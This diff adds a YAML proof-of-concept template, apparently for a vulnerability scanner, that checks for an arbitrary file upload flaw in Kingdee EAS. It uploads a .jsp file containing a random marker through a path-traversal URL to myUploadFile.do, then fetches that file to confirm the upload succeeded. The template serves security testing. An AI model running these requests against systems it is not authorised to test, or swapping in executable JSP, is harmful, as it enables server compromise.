@@ -1,0 +1,30 @@
+id: poc-yaml-kingdee-eas-myuploadfile-file-upload
+info:
+  name: 金蝶 EAS myUploadFile 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 金蝶 EAS
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /easportal/buffalo/%2e%2e/cm/myUploadFile.do
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
+  data: '------WebKitFormBoundarySq4lDnabv8CwHfvx
+
+    Content-Disposition: form-data; name="myFile"; filename="{{.t1}}.jsp"
+
+    Content-Type: text/html
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundarySq4lDnabv8CwHfvx--'
+  expression: status_code == 200 && contains(body,"context is null")
+- method: GET
+  path: /easportal/buffalo/../{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
